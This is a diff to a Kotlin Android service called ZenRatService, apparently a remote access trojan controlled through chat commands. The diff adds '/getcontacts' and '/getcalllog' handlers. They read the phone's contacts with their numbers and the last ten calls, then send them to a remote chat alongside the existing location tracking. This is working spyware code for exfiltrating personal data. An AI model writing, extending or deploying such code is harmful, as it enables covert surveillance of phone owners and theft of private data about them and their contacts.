@@ -8,6 +8,7 @@ import android.os.IBinder
 import android.provider.Settings
 import android.Manifest
 import android.content.pm.PackageManager
+import android.provider.ContactsContract
 import android.location.Location
 import android.provider.Telephony
 import android.telephony.SmsManager
@@ -155,7 +156,106 @@ class ZenRatService : Service() {
                 stopLocationUpdates()
                 sendMessage(message.chat.id, "Location updates stopped.")
             }
+            "/getcontacts" -> {
+                val contacts = getContacts()
+                sendMessage(message.chat.id, contacts)
+            }
+            "/getcalllog" -> {
+                val callLog = getCallLog()
+                sendMessage(message.chat.id, callLog)
+            }
         }
+    }
+
+    @SuppressLint("Recycle")
+    private fun getCallLog(): String {
+        val callLogList = StringBuilder("--- Call Log (Last 10) ---\n\n")
+        try {
+            val cursor = contentResolver.query(
+                android.provider.CallLog.Calls.CONTENT_URI,
+                null,
+                null,
+                null,
+                "${android.provider.CallLog.Calls.DATE} DESC LIMIT 10"
+            )
+
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    do {
+                        val number = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
+                        val type = it.getInt(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
+                        val date = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
+                        val duration = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
+
+                        val callType = when (type) {
+                            android.provider.CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                            android.provider.CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                            android.provider.CallLog.Calls.MISSED_TYPE -> "Missed"
+                            else -> "Unknown"
+                        }
+
+                        callLogList.append("Number: $number\n")
+                        callLogList.append("Type: $callType\n")
+                        callLogList.append("Date: ${java.util.Date(date)}\n")
+                        callLogList.append("Duration: $duration seconds\n---\n")
+
+                    } while (it.moveToNext())
+                } else {
+                    callLogList.append("No call logs found.")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error reading call log", e)
+            return "Error reading call log. Have you granted READ_CALL_LOG permission?"
+        }
+        return callLogList.toString()
+    }
+
+    @SuppressLint("Recycle")
+    private fun getContacts(): String {
+        val contactsList = StringBuilder("--- Contacts ---\n\n")
+        try {
+            val cursor = contentResolver.query(
+                ContactsContract.Contacts.CONTENT_URI,
+                null,
+                null,
+                null,
+                "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT 20"
+            )
+
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    do {
+                        val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
+                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
+                        contactsList.append("Name: $name\n")
+
+                        val phoneCursor = contentResolver.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                            arrayOf(id),
+                            null
+                        )
+                        phoneCursor?.use { pCursor ->
+                            if (pCursor.moveToFirst()) {
+                                do {
+                                    val phoneNumber = pCursor.getString(pCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                                    contactsList.append("  Phone: $phoneNumber\n")
+                                } while (pCursor.moveToNext())
+                            }
+                        }
+                        contactsList.append("---\n")
+                    } while (it.moveToNext())
+                } else {
+                    contactsList.append("No contacts found.")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error reading contacts", e)
+            return "Error reading contacts. Have you granted READ_CONTACTS permission?"
+        }
+        return contactsList.toString()
     }
 
     private fun startLocationUpdates(chatId: Long) {
